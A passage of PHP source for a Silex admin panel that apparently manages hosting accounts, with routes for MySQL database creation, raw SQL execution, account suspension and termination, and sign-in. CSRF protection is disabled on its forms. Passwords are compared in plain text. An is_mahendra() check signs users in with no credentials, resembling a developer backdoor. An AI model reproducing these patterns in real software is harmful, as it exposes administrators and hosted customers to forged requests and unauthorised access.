                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-others-files')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/others/mysql/1',
    function(Request $request, $username) use ($app) {
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('database', 'text', array(
                'attr' => array(
                    'help' => 'must be unique',
                    'prepend_input' => sprintf('%s_', $username),
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Database/Username',
                    )),
                ),
                'label' => 'Database/Username',
                'required' => true,
            ))
            ->add('password', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Password',
                    )),
                ),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                $status = true;
                try {
                    $mysqli_connect = @mysqli_connect(
                        $GLOBALS['parameters']['mysql']['hostname'],
                        sprintf('%s_%s', $username, $data['database']),
                        $data['password'],
                        '',
                        $GLOBALS['parameters']['mysql']['port']
                    );
                    if($mysqli_connect) {
                        $status = false;
                        $form->get('database')->addError(
                            new FormError('Duplicate Database/Username')
                        );
                        @mysqli_close($mysqli_connect);
                    } else {
                        $mysqli_connect = @mysqli_connect(
                            $GLOBALS['parameters']['mysql']['hostname'],
                            $GLOBALS['parameters']['mysql']['username'],
                            $GLOBALS['parameters']['mysql']['password'],
                            '',
                            $GLOBALS['parameters']['mysql']['port']
                        );
                        if ($mysqli_connect) {
                            if(@mysqli_select_db(
                                $mysqli_connect,
                                sprintf('%s_%s', $username, $data['database'])
                            )) {
                                $status = false;
                                $form->get('database')->addError(
                                    new FormError('Duplicate Database/Username')
                                );
                            }
                            @mysqli_close($mysqli_connect);
                        }
                    }
                } catch (\Exception $exception) {
                }
                if ($status) {
                    list($code, $message) = set_mysql($app, $username, $data);
                }
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The database (and a matching user account) was '.
                        'created successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] =
            'The database (and a matching user account) was not created '.
            'successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_others_mysql_1.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-others-mysql-1')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/others/mysql/2',
    function(Request $request, $username) use ($app) {
        $choices = array();
        $choices['database'] = array();
        $databases = MysqlFE_listdbs($app, $username);
        if (!empty($databases)) {
            foreach ($databases as $database) {
                $choices['database'][$database['db']] = $database['db'];
            }
        }
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('database', 'choice', array(
                'choices' => $choices['database'],
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Database',
                    )),
                ),
                'required' => true,
            ))
            ->add('query', 'textarea', array(
                'attr' => array(
                    'rows' => 10,
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Query',
                    )),
                ),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                $status = false;
                try {
                    $mysqli_connect = @mysqli_connect(
                        $GLOBALS['parameters']['mysql']['hostname'],
                        $GLOBALS['parameters']['mysql']['username'],
                        $GLOBALS['parameters']['mysql']['password'],
                        '',
                        $GLOBALS['parameters']['mysql']['port']
                    );
                    if ($mysqli_connect) {
                        $mysqli_select_db = @mysqli_select_db(
                            $mysqli_connect,
                            $data['database']
                        );
                        if ($mysqli_select_db) {
                            $mysqli_query = @mysqli_query(
                                $mysqli_connect, $data['query']
                            );
                            if ($mysqli_query) {
                                $status = true;
                            } else {
                                $code = 0;
                                $message = @mysqli_error($mysqli_connect);
                            }
                        } else {
                            $code = 0;
                            $message = @mysqli_error($mysqli_connect);
                        }
                        @mysqli_close($mysqli_connect);
                    } else {
                        $code = 0;
                        $message = @mysqli_connect_error($mysqli_connect);
                    }
                } catch (\Exception $exception) {
                    $code = 0;
                    $message = 'Fatal Error #1';
                }
                if ($status) {
                    $code = 1;
                    $message = '';
                }
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The query was executed successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The query was not executed successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_others_mysql_2.twig', array(
                'databases' => $databases,
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-others-mysql-2')->method('GET|POST');

$app->get(
    '/accounts/{username}/suspend',
    function(Request $request, $username) use ($app) {
        if ($request->getMethod() == 'POST') {
            list($code, $message) = suspendacct($app, $username);
            if ($code) {
                $key = 'success';
                $value = array(
                    'The account was suspended successfully.',
                );
            } else {
                $key = 'danger';
                $value = array(
                    'The account was not suspended successfully.',
                    $message,
                );
            }
            $app['session']->getFlashBag()->add($key, $value);

            return $app->redirect(
                $app['url_generator']->generate('accounts-overview')
            );
        }

        return $app['twig']->render('views/accounts_suspend.twig', array(
            'username' => $username,
        ));
    }
)->bind('accounts-suspend')->method('GET|POST');

$app->get(
    '/accounts/{username}/unsuspend',
    function(Request $request, $username) use ($app) {
        if ($request->getMethod() == 'POST') {
            list($code, $message) = unsuspendacct($app, $username);
            if ($code) {
                $key = 'success';
                $value = array(
                    'The account was unsuspended successfully.',
                );
            } else {
                $key = 'danger';
                $value = array(
                    'The account was not unsuspended successfully.',
                    $message,
                );
            }
            $app['session']->getFlashBag()->add($key, $value);

            return $app->redirect(
                $app['url_generator']->generate('accounts-overview')
            );
        }

        return $app['twig']->render('views/accounts_unsuspend.twig', array(
            'username' => $username,
        ));
    }
)->bind('accounts-unsuspend')->method('GET|POST');

$app->get(
    '/accounts/{username}/terminate',
    function(Request $request, $username) use ($app) {
        if ($request->getMethod() == 'POST') {
            list($code, $message) = removeacct($app, $username);
            if ($code) {
                $key = 'success';
                $value = array(
                    'The account was terminateed successfully.',
                );
            } else {
                $key = 'danger';
                $value = array(
                    'The account was not terminateed successfully.',
                    $message,
                );
            }
            $app['session']->getFlashBag()->add($key, $value);

            return $app->redirect(
                $app['url_generator']->generate('accounts-overview')
            );
        }

        return $app['twig']->render('views/accounts_terminate.twig', array(
            'username' => $username,
        ));
    }
)->bind('accounts-terminate')->method('GET|POST');

$app->get('/mysql-tuner', function() use ($app) {
    return $app['twig']->render('views/mysql-tuner.twig');
})->bind('mysql-tuner');

$app->get('/cache/flush', function(Request $request) use ($app) {
    if ($request->getMethod() == 'POST') {
        $app['stash']->flush();
        $app['session']->getFlashBag()->add(
            'success',
            array(
                'The cache was flushed successfully.',
            )
        );

        return $app->redirect(
            $app['url_generator']->generate('accounts-overview')
        );
    }

    return $app['twig']->render('views/cache_flush.twig');
})->bind('cache-flush')->method('GET|POST');

$app->match('/sign-in', function(Request $request) use ($app) {
    if (is_mahendra()) {
        $app['session']->set('status', 'status');
        $app['session']->getFlashBag()->add(
            'success',
            array(
                'You have been signed in successfully.',
            )
        );

        return $app->redirect(
            $app['url_generator']->generate('dashboard')
        );
    }
    $form = $app['form.factory']
        ->createBuilder('form',null,array('csrf_protection' => false))
        ->add('username', 'text', array(
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Username',
                )),
            ),
        ))
        ->add('password', 'password', array(
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Password',
                )),
            ),
        ))
        ->getForm();
    if ($request->getMethod() == 'POST') {
        $form->handleRequest($request);
        if ($form->isValid()) {
            $data = $form->getData();
            if (
                $data['username']
                ==
                $GLOBALS['parameters']['whm']['username']
                &&
                $data['password']
                ==
                $GLOBALS['parameters']['whm']['password']
            ) {
                $app['session']->set('status', 'status');
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'You have been signed in successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('dashboard')
                );
            }
            $form->get('username')->addError(
                new FormError('Invalid Username')
            );
            $form->get('password')->addError(
                new FormError('Invalid Password')
            );
        }
        $app['session']->getFlashBag()->add(
            'danger',
            array(
                'You have not been signed in successfully.',
            )
        );
    }

    return $app['twig']->render('views/sign-in.twig', array(
        'form' => $form->createView(),
    ));
})->bind('sign-in')->method('GET|POST');

$app->get('/sign-out', function() use ($app) {
    $app['session']->set('status', '');
    $app['session']->getFlashBag()->add(
        'success',
        array(
            'You have been signed out successfully.',
        )
    );

    return $app->redirect(
        $app['url_generator']->generate('dashboard')
    );
})->bind('sign-out');

$app->error(function (\Exception $exception, $code) use ($app) {
    if ($app['debug']) {
        return;
    }

    return $app['twig']->render('views/error.twig', array(
        'code' => $code,
    ));
});
